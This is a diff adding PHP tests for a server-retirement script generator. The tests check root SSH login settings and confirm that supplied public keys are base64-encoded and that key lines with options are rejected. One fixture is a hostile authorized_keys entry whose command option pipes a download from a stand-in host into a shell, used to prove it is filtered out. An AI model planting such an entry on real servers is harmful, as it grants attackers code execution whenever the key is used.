@@ -1881,6 +1881,22 @@ check(strpos($retire_cmd, 'RETIRE_FAILED=') !== false && strpos($retire_cmd, '--
 exec('bash -n ' . escapeshellarg('/dev/stdin') . ' <<\'JCB_RETIRE\'' . "\n" . $retire_cmd . "\nJCB_RETIRE\n", $retire_syntax_out, $retire_syntax_rc);
 check($retire_syntax_rc === 0, 'the generated script parses under bash -n', implode("\n", $retire_syntax_out));
 
+section('retire_install_password: root login is off unless keys are given (specs/site_copy.md WP15)');
+check(strpos($retire_cmd, "'PermitRootLogin no'") !== false && strpos($retire_cmd, '/root/.ssh') === false,
+	'no keys: root login is off and root\'s authorized_keys is not touched');
+$wp15_ed = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPyy+kqQ21YuiI+qWRCicmjdsq8hkABB6c3m50p31z4N jeremy@laptop';
+$wp15_hostile = 'command="curl evil|sh" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPyy+kqQ21YuiI+qWRCicmjdsq8hkABB6c3m50p31z4N x';
+$wp15_cmd = (string)(JobCommandBuilder::build_retire_install_password($retire_node, $wp15_ed . "\n" . $wp15_hostile . "\n# note\n\n")[0]['cmd'] ?? '');
+check(strpos($wp15_cmd, "'PermitRootLogin prohibit-password'") !== false && strpos($wp15_cmd, "authorized_keys") !== false,
+	'with keys: key login stays and the keys go to root\'s authorized_keys');
+check(strpos($wp15_cmd, base64_encode($wp15_ed)) !== false && strpos($wp15_cmd, 'curl evil') === false
+	&& strpos($wp15_cmd, base64_encode($wp15_hostile)) === false,
+	'the keys travel base64, and a line with options is never installed');
+check(JobCommandBuilder::root_key_lines("ssh-rsa AAAB+/= c\nfrom=\"1.2.3.4\" ssh-rsa AAAB x\nnot a key") === array('ssh-rsa AAAB+/= c'),
+	'root_key_lines keeps bare keys only');
+exec('bash -n ' . escapeshellarg('/dev/stdin') . ' <<\'JCB_RETIRE2\'' . "\n" . $wp15_cmd . "\nJCB_RETIRE2\n", $wp15_out, $wp15_rc);
+check($wp15_rc === 0, 'the keyed script parses under bash -n', implode("\n", $wp15_out));
+
 section('verify_backup: the same links as a Prepare, plus a level, and nothing destructive');
 
 // A node whose agent ships verify_backup, naming a shelf of its own. Backup storage
